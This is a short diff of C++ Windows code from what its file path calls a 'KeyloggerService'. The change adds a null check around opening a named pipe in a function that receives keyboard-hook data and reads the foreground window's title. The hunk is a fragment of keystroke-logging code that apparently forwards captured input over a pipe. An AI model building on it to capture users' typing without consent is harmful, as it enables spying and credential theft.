@@ -296,23 +296,25 @@ DWORD WINAPI readCommandThread(LPVOID lpParam)
 
 void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
     //if (!writePipe)return;
-    writePipe = CreateFile(
-        L"\\\\.\\pipe\\mywritepipe",
-        GENERIC_WRITE,
-        0,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL);
+    if (!writePipe) {
+        writePipe = CreateFile(
+            L"\\\\.\\pipe\\mywritepipe",
+            GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL);
 
-    if (writePipe == INVALID_HANDLE_VALUE) {
-        //std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
-        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!DllMain.log", std::ios_base::app);
-        if (outFile.is_open()) {
-            outFile << "Failed to open named pipe: " << GetLastError() << std::endl;
-            outFile.close();
+        if (writePipe == INVALID_HANDLE_VALUE) {
+            //std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
+            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!DllMain.log", std::ios_base::app);
+            if (outFile.is_open()) {
+                outFile << "Failed to open named pipe: " << GetLastError() << std::endl;
+                outFile.close();
+            }
+            //break;
         }
-        //break;
     }
     HWND window = GetForegroundWindow();
     const int MAX_TITLE_LENGTH = 1024;
